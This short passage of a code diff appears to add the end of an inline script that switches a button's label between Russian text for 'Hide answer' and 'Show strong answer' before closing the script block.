+    ivb.textContent=open?'Скрыть ответ':'Показать сильный ответ';
+  });
+})();
+</script>
